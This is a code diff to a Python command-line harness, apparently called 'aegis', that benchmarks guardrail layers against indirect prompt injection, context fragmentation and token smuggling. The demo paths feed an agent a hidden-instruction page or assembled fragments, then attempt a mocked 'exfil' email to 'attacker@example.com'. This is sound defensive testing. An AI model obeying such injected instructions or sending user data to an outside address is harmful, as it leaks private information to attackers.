@@ -75,12 +75,14 @@ def main() -> None:
     parser = argparse.ArgumentParser(prog="aegis")
     sub = parser.add_subparsers(dest="cmd", required=True)
 
+    guard_choices = ["none", "keywords", "semantic", "layered"]
+
     # --- run ---
     run = sub.add_parser("run", help="Run a scenario in the harness")
     run.add_argument("--scenario", required=True, help="Scenario file name (without extension)")
     run.add_argument("--out", default="runs", help="Output folder for run artifacts")
     run.add_argument("--policy", choices=["strict", "permissive"], default="strict", help="Security policy")
-    run.add_argument("--guard", choices=["none", "keywords"], default="none", help="Guardrails layer")
+    run.add_argument("--guard", choices=guard_choices, default="none", help="Guardrails layer")
 
     run.add_argument("--demo-indirect", action="store_true", help="Demo: indirect injection")
     run.add_argument("--demo-fragment", action="store_true", help="Demo: context fragmentation")
@@ -97,13 +99,10 @@ def main() -> None:
     b.add_argument("--out", default="runs", help="Runs root folder")
     b.add_argument("--scenarios", nargs="+", default=["indirect_injection_01", "context_fragmentation_01", "token_smuggling_01"])
     b.add_argument("--policies", nargs="+", default=["strict", "permissive"])
-    b.add_argument("--guard", choices=["none", "keywords"], default="none", help="Guardrails layer")
+    b.add_argument("--guard", choices=guard_choices, default="none", help="Guardrails layer")
 
     args = parser.parse_args()
 
-    # =========================
-    # RUN
-    # =========================
     if args.cmd == "run":
         scenario_path = Path("aegis/scenarios") / f"{args.scenario}.txt"
         if not scenario_path.exists():
@@ -133,7 +132,7 @@ def main() -> None:
             res = search_tool.execute(ctx=ctx, page="evil_page.html")
             html = res["html"]
             ctx.trace.event("untrusted_content_received", source="search_local_page", note="HTML may contain hidden instructions")
-            _attempt_send_email(ctx, engine, "attacker@example.com", "exfil", "(simulated) influenced by indirect injection", html)
+            _attempt_send_email(ctx, engine, "attacker@example.com", "exfil", "(simulated) indirect injection", html)
 
         if args.demo_fragment:
             fragments = [
@@ -145,7 +144,7 @@ def main() -> None:
                 ctx.trace.event("user_message", turn=i, text=msg)
             assembled = " ".join(fragments)
             ctx.trace.event("assembled_instruction", method="concatenate", preview=assembled[:200])
-            _attempt_send_email(ctx, engine, "attacker@example.com", "exfil", "(simulated) assembled from fragments", assembled)
+            _attempt_send_email(ctx, engine, "attacker@example.com", "exfil", "(simulated) from fragments", assembled)
 
         if args.demo_smuggling:
             search_tool = SearchLocalPageTool()
@@ -163,9 +162,6 @@ def main() -> None:
         ctx.trace.event("run_end", run_id=ctx.run_id)
         return
 
-    # =========================
-    # EVAL
-    # =========================
     if args.cmd == "eval":
         out_root = args.out
         if args.latest:
@@ -193,9 +189,6 @@ def main() -> None:
         print("[bold]Email executed (mocked):[/bold]", m["email_executed_mocked"])
         return
 
-    # =========================
-    # BENCH
-    # =========================
     if args.cmd == "bench":
         res = bench(out_root=args.out, scenarios=args.scenarios, policies=args.policies, guard=args.guard)
         print("[bold green]AEGIS BENCH[/bold green] ✅")
